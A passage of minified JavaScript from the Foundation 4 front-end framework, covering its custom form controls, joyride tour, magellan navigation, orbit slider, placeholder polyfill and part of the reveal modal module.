i.toggleClass("open"),i.hasClass("open")?e(r.scope).on("click.fndtn.forms.customdropdown",function(){i.removeClass("open"),e(r.scope).off(".fndtn.forms.customdropdown")}):e(r.scope).on(".fndtn.forms.customdropdown"),!1}).on("click.fndtn.forms touchend.fndtn.forms","form.custom div.custom.dropdown li",function(t){var n=e(this),r=n.closest("div.custom.dropdown"),i=r.prev(),s=0;t.preventDefault(),t.stopPropagation();if(!e(this).hasClass("disabled")){e("div.dropdown").not(r).removeClass("open");var o=n.closest("ul").find("li.selected");o.removeClass("selected"),n.addClass("selected"),r.removeClass("open").find("a.current").html(n.html()),n.closest("ul").find("li").each(function(e){n[0]==this&&(s=e)}),i[0].selectedIndex=s,i.data("prevalue",o.html()),i.trigger("change")}}),e(t).on("keydown",function(t){var r=n.activeElement,i=e(".custom.dropdown.open");if(i.length>0){t.preventDefault(),t.which===13&&i.find("li.selected").trigger("click");if(t.which===38){var s=i.find("li.selected"),o=s.prev(":not(.disabled)");o.length>0&&(s.removeClass("selected"),o.addClass("selected"))}else if(t.which===40){var s=i.find("li.selected"),u=s.next(":not(.disabled)");u.length>0&&(s.removeClass("selected"),u.addClass("selected"))}}}),this.settings.init=!0},append_custom_markup:function(t,n){var r=e(n).hide(),i=r.attr("type"),s=r.next("span.custom."+i);s.length===0&&(s=e('<span class="custom '+i+'"></span>').insertAfter(r)),s.toggleClass("checked",r.is(":checked")),s.toggleClass("disabled",r.is(":disabled"))},append_custom_select:function(t,n){var r=Foundation.libs.forms,i=e(n),s=i.next("div.custom.dropdown"),o=s.find("ul"),u=s.find(".current"),a=s.find(".selector"),f=i.find("option"),l=f.filter(":selected"),c=i.attr("class")?i.attr("class").split(" "):[],h=0,p="",d,v=!1;if(i.hasClass(r.settings.disable_class))return;if(s.length===0){var m=i.hasClass("small")?"small":i.hasClass("medium")?"medium":i.hasClass("large")?"large":i.hasClass("expand")?"expand":"";s=e('<div class="'+["custom","dropdown",m].concat(c).filter(function(e,t,n){return e==""?!1:n.indexOf(e)==t}).join(" ")+'"><a href="#" class="selector"></a><ul /></div>'),a=s.find(".selector"),o=s.find("ul"),p=f.map(function(){return"<li>"+e(this).html()+"</li>"}).get().join(""),o.append(p),v=s.prepend('<a href="#" class="current">'+l.html()+"</a>").find(".current"),i.after(s).hide()}else p=f.map(function(){return"<li>"+e(this).html()+"</li>"}).get().join(""),o.html("").append(p);s.toggleClass("disabled",i.is(":disabled")),d=o.find("li"),f.each(function(t){this.selected&&(d.eq(t).addClass("selected"),v&&v.html(e(this).html())),e(this).is(":disabled")&&d.eq(t).addClass("disabled")});if(!s.is(".small, .medium, .large, .expand")){s.addClass("open");var r=Foundation.libs.forms;r.hidden_fix.adjust(o),h=r.outerWidth(d)>h?r.outerWidth(d):h,Foundation.libs.forms.hidden_fix.reset(),s.removeClass("open")}},refresh_custom_select:function(t){var n=this,r=0,i=t.next(),s=t.find("option");i.find("ul").html(""),s.each(function(){var t=e("<li>"+e(this).html()+"</li>");i.find("ul").append(t)}),s.each(function(t){this.selected&&(i.find("li").eq(t).addClass("selected"),i.find(".current").html(e(this).html())),e(this).is(":disabled")&&i.find("li").eq(t).addClass("disabled")}),i.removeAttr("style").find("ul").removeAttr("style"),i.find("li").each(function(){i.addClass("open"),n.outerWidth(e(this))>r&&(r=n.outerWidth(e(this))),i.removeClass("open")})},toggle_checkbox:function(e){var t=e.prev(),n=t[0];!1===t.is(":disabled")&&(n.checked=n.checked?!1:!0,e.toggleClass("checked"),t.trigger("change"))},toggle_radio:function(e){var t=e.prev(),n=t.closest("form.custom"),r=t[0];!1===t.is(":disabled")&&(n.find('input[type="radio"][name="'+this.escape(t.attr("name"))+'"]').next().not(e).removeClass("checked"),e.hasClass("checked")||e.toggleClass("checked"),r.checked=e.hasClass("checked"),t.trigger("change"))},escape:function(e){return e.replace(/[-[\]{}()*+?.,\\^$|#\s]/g,"\\$&")},hidden_fix:{tmp:[],hidden:null,adjust:function(t){var n=this;n.hidden=t.parents().andSelf().filter(":hidden"),n.hidden.each(function(){var t=e(this);n.tmp.push(t.attr("style")),t.css({visibility:"hidden",display:"block"})})},reset:function(){var t=this;t.hidden.each(function(n){var i=e(this),s=t.tmp[n];s===r?i.removeAttr("style"):i.attr("style",s)}),t.tmp=[],t.hidden=null}},off:function(){e(this.scope).off(".fndtn.forms")}}}(Foundation.zj,this,this.document),function(e,t,n,r){"use strict";Foundation.libs.joyride={name:"joyride",version:"4.0.0",defaults:{tipLocation:"bottom",nubPosition:"auto",scrollSpeed:300,timer:0,startTimerOnClick:!0,startOffset:0,nextButton:!0,tipAnimation:"fade",pauseAfter:[],tipAnimationFadeSpeed:300,cookieMonster:!1,cookieName:"joyride",cookieDomain:!1,cookieExpires:365,tipContainer:"body",postRideCallback:function(){},postStepCallback:function(){},template:{link:'<a href="#close" class="joyride-close-tip">&times;</a>',timer:'<div class="joyride-timer-indicator-wrap"><span class="joyride-timer-indicator"></span></div>',tip:'<div class="joyride-tip-guide"><span class="joyride-nub"></span></div>',wrapper:'<div class="joyride-content-wrapper"></div>',button:'<a href="#" class="small button joyride-next-tip"></a>'}},settings:{},init:function(t,n,r){return this.scope=t||this.scope,Foundation.inherit(this,"throttle data_options scrollTo scrollLeft delay"),typeof n=="object"?e.extend(!0,this.settings,this.defaults,n):e.extend(!0,this.settings,this.defaults,r),typeof n!="string"?(this.settings.init||this.events(),this.settings.init):this[n].call(this,r)},events:function(){var n=this;e(this.scope).on("click.joyride",".joyride-next-tip, .joyride-modal-bg",function(e){e.preventDefault(),this.settings.$li.next().length<1?this.end():this.settings.timer>0?(clearTimeout(this.settings.automate),this.hide(),this.show(),this.startTimer()):(this.hide(),this.show())}.bind(this)).on("click.joyride",".joyride-close-tip",function(e){e.preventDefault(),this.end()}.bind(this)),e(t).on("resize.fndtn.joyride",n.throttle(function(){e("[data-joyride]").length>0&&n.settings.$next_tip&&(n.is_phone()?n.pos_phone():n.pos_default(!1,!0))},100)),this.settings.init=!0},start:function(){var t=this,n=e(this.scope).find("[data-joyride]"),r=["timer","scrollSpeed","startOffset","tipAnimationFadeSpeed","cookieExpires"],i=r.length;this.settings.init||this.init(),this.settings.$content_el=n,this.settings.body_offset=e(this.settings.tipContainer).position(),this.settings.$tip_content=this.settings.$content_el.find("> li"),this.settings.paused=!1,this.settings.attempts=0,this.settings.tipLocationPatterns={top:["bottom"],bottom:[],left:["right","top","bottom"],right:["left","top","bottom"]},typeof e.cookie!="function"&&(this.settings.cookieMonster=!1);if(!this.settings.cookieMonster||this.settings.cookieMonster&&e.cookie(this.settings.cookieName)===null)this.settings.$tip_content.each(function(n){var s=e(this);e.extend(!0,t.settings,t.data_options(s));for(var o=i-1;o>=0;o--)t.settings[r[o]]=parseInt(t.settings[r[o]],10);t.create({$li:s,index:n})}),!this.settings.startTimerOnClick&&this.settings.timer>0?(this.show("init"),this.startTimer()):this.show("init")},resume:function(){this.set_li(),this.show()},tip_template:function(t){var n,r;return t.tip_class=t.tip_class||"",n=e(this.settings.template.tip).addClass(t.tip_class),r=e.trim(e(t.li).html())+this.button_text(t.button_text)+this.settings.template.link+this.timer_instance(t.index),n.append(e(this.settings.template.wrapper)),n.first().attr("data-index",t.index),e(".joyride-content-wrapper",n).append(r),n[0]},timer_instance:function(t){var n;return t===0&&this.settings.startTimerOnClick&&this.settings.timer>0||this.settings.timer===0?n="":n=this.outerHTML(e(this.settings.template.timer)[0]),n},button_text:function(t){return this.settings.nextButton?(t=e.trim(t)||"Next",t=this.outerHTML(e(this.settings.template.button).append(t)[0])):t="",t},create:function(t){var n=t.$li.attr("data-button")||t.$li.attr("data-text"),r=t.$li.attr("class"),i=e(this.tip_template({tip_class:r,index:t.index,button_text:n,li:t.$li}));e(this.settings.tipContainer).append(i)},show:function(t){var n=null;this.settings.$li===r||e.inArray(this.settings.$li.index(),this.settings.pauseAfter)===-1?(this.settings.paused?this.settings.paused=!1:this.set_li(t),this.settings.attempts=0,this.settings.$li.length&&this.settings.$target.length>0?(this.settings.tipSettings=e.extend(this.settings,this.data_options(this.settings.$li)),this.settings.timer=parseInt(this.settings.timer,10),this.settings.tipSettings.tipLocationPattern=this.settings.tipLocationPatterns[this.settings.tipSettings.tipLocation],/body/i.test(this.settings.$target.selector)||this.scroll_to(),this.is_phone()?this.pos_phone(!0):this.pos_default(!0),n=this.settings.$next_tip.find(".joyride-timer-indicator"),/pop/i.test(this.settings.tipAnimation)?(n.width(0),thsi.settings.timer>0?(this.settings.$next_tip.show(),this.delay(function(){n.animate({width:n.parent().width()},this.settings.timer,"linear")}.bind(this),this.settings.tipAnimationFadeSpeed)):this.settings.$next_tip.show()):/fade/i.test(this.settings.tipAnimation)&&(n.width(0),this.settings.timer>0?(this.settings.$next_tip.fadeIn(this.settings.tipAnimationFadeSpeed).show(),this.delay(function(){n.animate({width:n.parent().width()},this.settings.timer,"linear")}.bind(this),this.settings.tipAnimationFadeSpeed)):this.settings.$next_tip.fadeIn(this.settings.tipAnimationFadeSpeed)),this.settings.$current_tip=this.settings.$next_tip):this.settings.$li&&this.settings.$target.length<1?this.show():this.end()):this.settings.paused=!0},is_phone:function(){return Modernizr?Modernizr.mq("only screen and (max-width: 767px)")||e(".lt-ie9").length>0:this.settings.$window.width()<767?!0:!1},hide:function(){this.settings.postStepCallback(this.settings.$li.index(),this.settings.$current_tip),e(".joyride-modal-bg").hide(),this.settings.$current_tip.hide()},set_li:function(e){e?(this.settings.$li=this.settings.$tip_content.eq(this.settings.startOffset),this.set_next_tip(),this.settings.$current_tip=this.settings.$next_tip):(this.settings.$li=this.settings.$li.next(),this.set_next_tip()),this.set_target()},set_next_tip:function(){this.settings.$next_tip=e(".joyride-tip-guide[data-index='"+this.settings.$li.index()+"']"),this.settings.$next_tip.data("closed","")},set_target:function(){var t=this.settings.$li.attr("data-class"),r=this.settings.$li.attr("data-id"),i=function(){return r?e(n.getElementById(r)):t?e("."+t).first():e("body")};this.settings.$target=i()},scroll_to:function(){var n,r;n=e(t).height()/2,r=Math.ceil(this.settings.$target.offset().top-n+this.outerHeight(this.settings.$next_tip)),r>0&&this.scrollTo(e("html, body"),r,this.settings.scrollSpeed)},paused:function(){return e.inArray(this.settings.$li.index()+1,this.settings.pauseAfter)===-1?!0:!1},restart:function(){this.hide(),this.settings.$li=r,this.show("init")},pos_default:function(n,r){var i=Math.ceil(e(t).height()/2),s=this.settings.$next_tip.offset(),o=this.settings.$next_tip.find(".joyride-nub"),u=Math.ceil(this.outerHeight(o)/2),a=n||!1;a&&(this.settings.$next_tip.css("visibility","hidden"),this.settings.$next_tip.show()),typeof r=="undefined"&&(r=!1);if(!/body/i.test(this.settings.$target.selector)){if(this.bottom()){var f=this.settings.$target.offset().left;Foundation.rtl&&(f=this.settings.$target.offset().width-this.settings.$next_tip.width()+f),this.settings.$next_tip.css({top:this.settings.$target.offset().top+u+this.outerHeight(this.settings.$target),left:f}),this.nub_position(o,this.settings.tipSettings.nubPosition,"top")}else if(this.top()){var f=this.settings.$target.offset().left;Foundation.rtl&&(f=this.settings.$target.offset().width-this.settings.$next_tip.width()+f),this.settings.$next_tip.css({top:this.settings.$target.offset().top-this.outerHeight(this.settings.$next_tip)-u,left:f}),this.nub_position(o,this.settings.tipSettings.nubPosition,"bottom")}else this.right()?(this.settings.$next_tip.css({top:this.settings.$target.offset().top,left:this.outerWidth(this.settings.$target)+this.settings.$target.offset().left}),this.nub_position(o,this.settings.tipSettings.nubPosition,"left")):this.left()&&(this.settings.$next_tip.css({top:this.settings.$target.offset().top,left:this.settings.$target.offset().left-this.outerWidth(this.settings.$next_tip)-u}),this.nub_position(o,this.settings.tipSettings.nubPosition,"right"));!this.visible(this.corners(this.settings.$next_tip))&&this.settings.attempts<this.settings.tipSettings.tipLocationPattern.length&&(o.removeClass("bottom").removeClass("top").removeClass("right").removeClass("left"),this.settings.tipSettings.tipLocation=this.settings.tipSettings.tipLocationPattern[this.settings.attempts],this.settings.attempts++,this.pos_default())}else this.settings.$li.length&&this.pos_modal(o);a&&(this.settings.$next_tip.hide(),this.settings.$next_tip.css("visibility","visible"))},pos_phone:function(t){var n=this.outerHeight(this.settings.$next_tip),r=this.settings.$next_tip.offset(),i=this.outerHeight(this.settings.$target),s=e(".joyride-nub",this.settings.$next_tip),o=Math.ceil(this.outerHeight(s)/2),u=t||!1;s.removeClass("bottom").removeClass("top").removeClass("right").removeClass("left"),u&&(this.settings.$next_tip.css("visibility","hidden"),this.settings.$next_tip.show()),/body/i.test(this.settings.$target.selector)?this.settings.$li.length&&this.pos_modal(s):this.top()?(this.settings.$next_tip.offset({top:this.settings.$target.offset().top-n-o}),s.addClass("bottom")):(this.settings.$next_tip.offset({top:this.settings.$target.offset().top+i+o}),s.addClass("top")),u&&(this.settings.$next_tip.hide(),this.settings.$next_tip.css("visibility","visible"))},pos_modal:function(t){this.center(),t.hide(),this.settings.$next_tip.data("closed")||(e(".joyride-modal-bg").length<1&&e("body").append('<div class="joyride-modal-bg">').show(),/pop/i.test(this.settings.tipAnimation)?e(".joyride-modal-bg").show():e(".joyride-modal-bg").fadeIn(this.settings.tipAnimationFadeSpeed))},center:function(){var n=e(t);return this.settings.$next_tip.css({top:(n.height()-this.outerHeight(this.settings.$next_tip))/2+n.scrollTop(),left:(n.width()-this.outerWidth(this.settings.$next_tip))/2+this.scrollLeft(n)}),!0},bottom:function(){return/bottom/i.test(this.settings.tipSettings.tipLocation)},top:function(){return/top/i.test(this.settings.tipSettings.tipLocation)},right:function(){return/right/i.test(this.settings.tipSettings.tipLocation)},left:function(){return/left/i.test(this.settings.tipSettings.tipLocation)},corners:function(n){var r=e(t),i=r.width()+this.scrollLeft(r),s=r.width()+r.scrollTop();return[n.offset().top<=r.scrollTop(),i<=n.offset().left+this.outerWidth(n),s<=n.offset().top+this.outerHeight(n),this.scrollLeft(r)>=n.offset().left]},visible:function(e){var t=e.length;while(t--)if(e[t])return!1;return!0},nub_position:function(e,t,n){t==="auto"?e.addClass(n):e.addClass(t)},startTimer:function(){this.settings.$li.length?this.settings.automate=setTimeout(function(){this.hide(),this.show(),this.startTimer()}.bind(this),this.settings.timer):clearTimeout(this.settings.automate)},end:function(){this.settings.cookieMonster&&e.cookie(this.settings.cookieName,"ridden",{expires:this.settings.cookieExpires,domain:this.settings.cookieDomain}),this.settings.timer>0&&clearTimeout(this.settings.automate),this.settings.$next_tip.data("closed",!0),e(".joyride-modal-bg").hide(),this.settings.$current_tip.hide(),this.settings.postStepCallback(this.settings.$li.index(),this.settings.$current_tip),this.settings.postRideCallback(this.settings.$li.index(),this.settings.$current_tip)},outerHTML:function(e){return e.outerHTML||(new XMLSerializer).serializeToString(e)},off:function(){e(this.scope).off(".joyride"),e(t).off(".joyride"),e(".joyride-close-tip, .joyride-next-tip, .joyride-modal-bg").off(".joyride"),e(".joyride-tip-guide, .joyride-modal-bg").remove(),clearTimeout(this.settings.automate),this.settings={}}}}(Foundation.zj,this,this.document),function(e,t,n,r){"use strict";Foundation.libs.magellan={name:"magellan",version:"4.0.0",settings:{activeClass:"active"},init:function(t,n,r){return this.scope=t||this.scope,Foundation.inherit(this,"data_options"),typeof n=="object"&&e.extend(!0,this.settings,n),typeof n!="string"?(this.settings.init||(this.fixed_magellan=e("[data-magellan-expedition]"),this.set_threshold(),this.last_destination=e("[data-magellan-destination]").last(),this.events()),this.settings.init):this[n].call(this,r)},events:function(){var n=this;e(this.scope).on("arrival.fndtn.magellan","[data-magellan-arrival]",function(t){var r=e(this),i=r.closest("[data-magellan-expedition]"),s=i.attr("data-magellan-active-class")||n.settings.activeClass;r.closest("[data-magellan-expedition]").find("[data-magellan-arrival]").not(r).removeClass(s),r.addClass(s)}),this.fixed_magellan.on("update-position.fndtn.magellan",function(){var t=e(this)}).trigger("update-position"),e(t).on("resize.fndtn.magellan",function(){this.fixed_magellan.trigger("update-position")}.bind(this)).on("scroll.fndtn.magellan",function(){var r=e(t).scrollTop();n.fixed_magellan.each(function(){var t=e(this);typeof t.data("magellan-top-offset")=="undefined"&&t.data("magellan-top-offset",t.offset().top),typeof t.data("magellan-fixed-position")=="undefined"&&t.data("magellan-fixed-position",!1);var i=r+n.settings.threshold>t.data("magellan-top-offset"),s=t.attr("data-magellan-top-offset");t.data("magellan-fixed-position")!=i&&(t.data("magellan-fixed-position",i),i?t.css({position:"fixed",top:0}):t.css({position:"",top:""}),i&&typeof s!="undefined"&&s!=0&&t.css({position:"fixed",top:s+"px"}))})}),this.last_destination.length>0&&e(t).on("scroll.fndtn.magellan",function(r){var i=e(t).scrollTop(),s=i+e(t).height(),o=Math.ceil(n.last_destination.offset().top);e("[data-magellan-destination]").each(function(){var t=e(this),r=t.attr("data-magellan-destination"),u=t.offset().top-i;u<=n.settings.threshold&&e("[data-magellan-arrival='"+r+"']").trigger("arrival"),s>=e(n.scope).height()&&o>i&&o<s&&e("[data-magellan-arrival]").last().trigger("arrival")})}),this.settings.init=!0},set_threshold:function(){this.settings.threshold||(this.settings.threshold=this.fixed_magellan.length>0?this.outerHeight(this.fixed_magellan,!0):0)},off:function(){e(this.scope).off(".fndtn.magellan")}}}(Foundation.zj,this,this.document),function(e,t,n,r){"use strict";Foundation.libs=Foundation.libs||{},Foundation.libs.orbit={name:"orbit",version:"4.1.0",settings:{timer_speed:1e4,animation_speed:500,bullets:!0,stack_on_small:!0,container_class:"orbit-container",stack_on_small_class:"orbit-stack-on-small",next_class:"orbit-next",prev_class:"orbit-prev",timer_container_class:"orbit-timer",timer_paused_class:"paused",timer_progress_class:"orbit-progress",slides_container_class:"orbit-slides-container",bullets_container_class:"orbit-bullets",bullets_active_class:"active",slide_number_class:"orbit-slide-number",caption_class:"orbit-caption",active_slide_class:"active",orbit_transition_class:"orbit-transitioning"},init:function(t,n,r){var i=this;Foundation.inherit(i,"data_options"),typeof n=="object"&&e.extend(!0,i.settings,n),e("[data-orbit]",t).each(function(t,n){var r=e.extend(!0,{},i);r._init(t,n)})},_container_html:function(){var e=this;return'<div class="'+e.settings.container_class+'"></div>'},_bullets_container_html:function(t){var n=this,r=e('<ol class="'+n.settings.bullets_container_class+'"></ol>');return t.each(function(t,i){var s=e('<li data-orbit-slide-number="'+(t+1)+'" class=""></li>');t===0&&s.addClass(n.settings.bullets_active_class),r.append(s)}),r},_slide_number_html:function(t,n){var r=this,i=e('<div class="'+r.settings.slide_number_class+'"></div>');return i.append("<span>"+t+"</span> of <span>"+n+"</span>"),i},_timer_html:function(){var e=this;return typeof e.settings.timer_speed=="number"&&e.settings.timer_speed>0?'<div class="'+e.settings.timer_container_class+'"><span></span><div class="'+e.settings.timer_progress_class+'"></div></div>':""},_next_html:function(){var e=this;return'<a href="#" class="'+e.settings.next_class+'">Next <span></span></a>'},_prev_html:function(){var e=this;return'<a href="#" class="'+e.settings.prev_class+'">Prev <span></span></a>'},_init:function(t,n){var r=this,i=e(n),s=i.wrap(r._container_html()).parent(),o=i.children();e.extend(!0,r.settings,r.data_options(i)),s.append(r._prev_html()),s.append(r._next_html()),i.addClass(r.settings.slides_container_class),r.settings.stack_on_small&&s.addClass(r.settings.stack_on_small_class),s.append(r._slide_number_html(1,o.length)),s.append(r._timer_html()),r.settings.bullets&&s.after(r._bullets_container_html(o)),i.append(o.first().clone().attr("data-orbit-slide","")),i.prepend(o.last().clone().attr("data-orbit-slide","")),i.css("marginLeft","-100%"),o.first().addClass(r.settings.active_slide_class),r._init_events(i),r._init_dimensions(i),r._start_timer(i)},_init_events:function(i){var s=this,o=i.parent();e(t).on("load.fndtn.orbit",function(){i.height(""),i.height(i.height(o.height())),i.trigger("orbit:ready")}).on("resize.fndtn.orbit",function(){i.height(""),i.height(i.height(o.height()))}),e(n).on("click.fndtn.orbit","[data-orbit-link]",function(t){t.preventDefault();var n=e(t.currentTarget).attr("data-orbit-link"),r=i.find("[data-orbit-slide="+n+"]").first();r.length===1&&(s._reset_timer(i,!0),s._goto(i,r.index(),function(){}))}),o.siblings("."+s.settings.bullets_container_class).on("click.fndtn.orbit","[data-orbit-slide-number]",function(t){t.preventDefault(),s._reset_timer(i,!0),s._goto(i,e(t.currentTarget).data("orbit-slide-number"),function(){})}),o.on("orbit:after-slide-change.fndtn.orbit",function(e,t){var n=o.find("."+s.settings.slide_number_class);n.length===1&&n.replaceWith(s._slide_number_html(t.slide_number,t.total_slides))}).on("orbit:next-slide.fndtn.orbit click.fndtn.orbit","."+s.settings.next_class,function(e){e.preventDefault(),s._reset_timer(i,!0),s._goto(i,"next",function(){})}).on("orbit:prev-slide.fndtn.orbit click.fndtn.orbit","."+s.settings.prev_class,function(e){e.preventDefault(),s._reset_timer(i,!0),s._goto(i,"prev",function(){})}).on("orbit:toggle-play-pause.fndtn.orbit click.fndtn.orbit touchstart.fndtn.orbit","."+s.settings.timer_container_class,function(t){t.preventDefault();var n=e(t.currentTarget).toggleClass(s.settings.timer_paused_class),r=n.closest("."+s.settings.container_class).find("."+s.settings.slides_container_class);n.hasClass(s.settings.timer_paused_class)?s._stop_timer(r):s._start_timer(r)}).on("touchstart.fndtn.orbit",function(e){e.touches||(e=e.originalEvent);var t={start_page_x:e.touches[0].pageX,start_page_y:e.touches[0].pageY,start_time:(new Date).getTime(),delta_x:0,is_scrolling:r};o.data("swipe-transition",t),e.stopPropagation()}).on("touchmove.fndtn.orbit",function(e){e.touches||(e=e.originalEvent);if(e.touches.length>1||e.scale&&e.scale!==1)return;var t=o.data("swipe-transition");typeof t=="undefined"&&(t={}),t.delta_x=e.touches[0].pageX-t.start_page_x,typeof t.is_scrolling=="undefined"&&(t.is_scrolling=!!(t.is_scrolling||Math.abs(t.delta_x)<Math.abs(e.touches[0].pageY-t.start_page_y)));if(!t.is_scrolling&&!t.active){e.preventDefault(),s._stop_timer(i);var n=t.delta_x<0?"next":"prev";t.active=!0,s._goto(i,n,function(){})}}).on("touchend.fndtn.orbit",function(e){o.data("swipe-transition",{}),e.stopPropagation()})},_init_dimensions:function(e){var t=e.parent(),n=e.children();e.css("width",n.length*100+"%"),n.css("width",100/n.length+"%"),e.height(t.height()),e.css("width",n.length*100+"%")},_start_timer:function(e){var t=this,n=e.parent(),r=function(){t._reset_timer(e,!1),t._goto(e,"next",function(){t._start_timer(e)})},i=n.find("."+t.settings.timer_container_class),s=i.find("."+t.settings.timer_progress_class),o=s.width()/i.width(),u=t.settings.timer_speed-o*t.settings.timer_speed;s.animate({width:"100%"},u,"linear",r),e.trigger("orbit:timer-started")},_stop_timer:function(e){var t=this,n=e.parent(),r=n.find("."+t.settings.timer_container_class),i=r.find("."+t.settings.timer_progress_class),s=i.width()/r.width();t._rebuild_timer(n,s*100+"%"),e.trigger("orbit:timer-stopped"),r=n.find("."+t.settings.timer_container_class),r.addClass(t.settings.timer_paused_class)},_reset_timer:function(e,t){var n=this,r=e.parent();n._rebuild_timer(r,"0%");if(typeof t=="boolean"&&t){var i=r.find("."+n.settings.timer_container_class);i.addClass(n.settings.timer_paused_class)}},_rebuild_timer:function(t,n){var r=this,i=t.find("."+r.settings.timer_container_class),s=e(r._timer_html()),o=s.find("."+r.settings.timer_progress_class);if(typeof Zepto=="function")i.remove(),t.append(s),o.css("width",n);else if(typeof jQuery=="function"){var u=i.find("."+r.settings.timer_progress_class);u.css("width",n),u.stop()}},_goto:function(t,n,r){var i=this,s=t.parent(),o=t.children(),u=t.find("."+i.settings.active_slide_class),a=u.index(),f=Foundation.rtl?"marginRight":"marginLeft";if(s.hasClass(i.settings.orbit_transition_class))return!1;n==="prev"?a===0?a=o.length-1:a--:n==="next"?a=(a+1)%o.length:typeof n=="number"&&(a=n%o.length),a===o.length-1&&n==="next"?(t.css(f,"0%"),a=1):a===0&&n==="prev"&&(t.css(f,"-"+(o.length-1)*100+"%"),a=o.length-2),s.addClass(i.settings.orbit_transition_class),u.removeClass(i.settings.active_slide_class),e(o[a]).addClass(i.settings.active_slide_class);var l=s.siblings("."+i.settings.bullets_container_class);l.length===1&&(l.children().removeClass(i.settings.bullets_active_class),e(l.children()[a-1]).addClass(i.settings.bullets_active_class));var c="-"+a*100+"%";t.trigger("orbit:before-slide-change");if(t.css(f)===c)s.removeClass(i.settings.orbit_transition_class),t.trigger("orbit:after-slide-change",[{slide_number:a,total_slides:t.children().length-2}]),r();else{var h={};h[f]=c,t.animate(h,i.settings.animation_speed,"linear",function(){s.removeClass(i.settings.orbit_transition_class),t.trigger("orbit:after-slide-change",[{slide_number:a,total_slides:t.children().length-2}]),r()})}}}}(Foundation.zj,this,this.document),function(e,t,n){function f(e){var t={},r=/^jQuery\d+$/;return n.each(e.attributes,function(e,n){n.specified&&!r.test(n.name)&&(t[n.name]=n.value)}),t}function l(e,r){var i=this,s=n(i);if(i.value==s.attr("placeholder")&&s.hasClass("placeholder"))if(s.data("placeholder-password")){s=s.hide().next().show().attr("id",s.removeAttr("id").data("placeholder-id"));if(e===!0)return s[0].value=r;s.focus()}else i.value="",s.removeClass("placeholder"),i==t.activeElement&&i.select()}function c(){var e,t=this,r=n(t),i=r,s=this.id;if(t.value==""){if(t.type=="password"){if(!r.data("placeholder-textinput")){try{e=r.clone().attr({type:"text"})}catch(o){e=n("<input>").attr(n.extend(f(this),{type:"text"}))}e.removeAttr("name").data({"placeholder-password":!0,"placeholder-id":s}).bind("focus.placeholder",l),r.data({"placeholder-textinput":e,"placeholder-id":s}).before(e)}r=r.removeAttr("id").hide().prev().attr("id",s).show()}r.addClass("placeholder"),r[0].value=r.attr("placeholder")}else r.removeClass("placeholder")}var r="placeholder"in t.createElement("input"),i="placeholder"in t.createElement("textarea"),s=n.fn,o=n.valHooks,u,a;r&&i?(a=s.placeholder=function(){return this},a.input=a.textarea=!0):(a=s.placeholder=function(){var e=this;return e.filter((r?"textarea":":input")+"[placeholder]").not(".placeholder").bind({"focus.placeholder":l,"blur.placeholder":c}).data("placeholder-enabled",!0).trigger("blur.placeholder"),e},a.input=r,a.textarea=i,u={get:function(e){var t=n(e);return t.data("placeholder-enabled")&&t.hasClass("placeholder")?"":e.value},set:function(e,r){var i=n(e);return i.data("placeholder-enabled")?(r==""?(e.value=r,e!=t.activeElement&&c.call(e)):i.hasClass("placeholder")?l.call(e,!0,r)||(e.value=r):e.value=r,i):e.value=r}},r||(o.input=u),i||(o.textarea=u),n(function(){n(t).delegate("form","submit.placeholder",function(){var e=n(".placeholder",this).each(l);setTimeout(function(){e.each(c)},10)})}),n(e).bind("beforeunload.placeholder",function(){n(".placeholder").each(function(){this.value=""})}))}(this,document,Foundation.zj),function(e,t,n,r){"use strict";Foundation.libs.reveal={name:"reveal",version:"4.0.9",locked:!1,settings:{animation:"fadeAndPop",animationSpeed:250,closeOnBackgroundClick:!0,dismissModalClass:"close-reveal-modal",bgClass:"reveal-modal-bg",open:function(){},opened:function(){},close:function(){},closed:function(){},bg:e(".reveal-modal-bg"),css:{open:{opacity:0,visibility:"visible",display:"block"},close:{opacity:1,visibility:"hidden",display:"none"}}},init:function(t,n,r){return this.scope=t||this.scope,Foundation.inherit(this,"data_options delay"),typeof n=="object"&&e.extend(!0,this.settings,n),typeof n!="string"?(this.events(),this.settings.init):this[n].call(this,r)},events:function(){var t=this;return e(this.scope).off(".fndtn.reveal").on("click.fndtn.reveal","[data-reveal-id]",function(n){n.preventDefault(),t.locked||(t.locked=!0,t.open.call(t,e(this)))}).on("click.fndtn.reveal touchend.click.fndtn.reveal",this.close_targets(),function(n){n.preventDefault(),t.locked||(t.locked=!0,t.close.call(t,e(this).closest(".reveal-modal")))}).on("open.fndtn.reveal",".reveal-modal",this.settings.open).on("opened.fndtn.reveal",".reveal-modal",this.settings.opened).on("opened.fndtn.reveal",".reveal-modal",this.open_video).on("close.fndtn.reveal",".reveal-modal",this.settings.close).on("closed.fndtn.reveal",".reveal-modal",this.settings.closed).on("closed.fndtn.reveal",".reveal-modal",this.close_video),!0},open:function(t){if(t)var n=e("#"+t.data("reveal-id"));else var n=e(this.scope);if(!n.hasClass("open")){var r=e(".reveal-modal.open");typeof n.data("css-top")=="undefined"&&n.data("css-top",parseInt(n.css("top"),10)).data("offset",this.cache_offset(n)),n.trigger("open"),r.length<1&&this.toggle_bg(n),this.hide(r,this.settings.css.open),this.show(n,this.settings.css.open)}},close:function(t){var t=t||e(this.scope),n=e(".reveal-modal.open");n.length>0&&(this.locked=!0,t.trigger("close"),this.toggle_bg(t),this.hide(n,this.settings.css.close))},close_targets:function(){var e="."+this.settings.dismissModalClass;return this.settings.closeOnBackgroundClick?e+", ."+this.settings.bgClass:e},toggle_bg:function(t){e(".reveal-modal-bg").length===0&&(this.settings.bg=e("<div />",{"class":this.settings.bgClass}).appendTo("body")),this.settings.bg.filter(":visible").length>0?this.hide(this.settings.bg):this.show(this.settings.bg)},show:function(n,r){if(r){if(/pop/i.test(this.settings.animation)){r.top=e(t).scrollTop()-n.data("offset")+"px";var i={top:e(t).scrollTop()+n.data("css-top")+"px",opacity:1};return this.delay(function(){return n.css(r).animate(i,this.settings.animationSpeed,"linear",function(){this.locked=!1,n.trigger("opened")}.bind(this)).addClass("open")}.bind(this),this.settings.animationSpeed/2)}if(/fade/i.test(this.settings.animation)){var i={opacity:1};return this.delay(function(){return n.css(r).animate(i,this.settings.animationSpeed,"linear",function(){this.locked=!1,n.trigger("opened")}.bind(this)).addClass("open")}.bind(this),this.settings.animationSpeed/2)}return n.css(r).show().css({opacity:1}).addClass("open").trigger("opened")}return/fade/i.test(this.settings.animation)?n.fadeIn(this.settings.animationSpeed/2):n.show()},hide:function(n,r){if(r){if(/pop/i.test(this.settings.animation)){var i={top:-e(t).scrollTop()-n.data("offset")+"px",opacity:0};return this.delay(function(){return 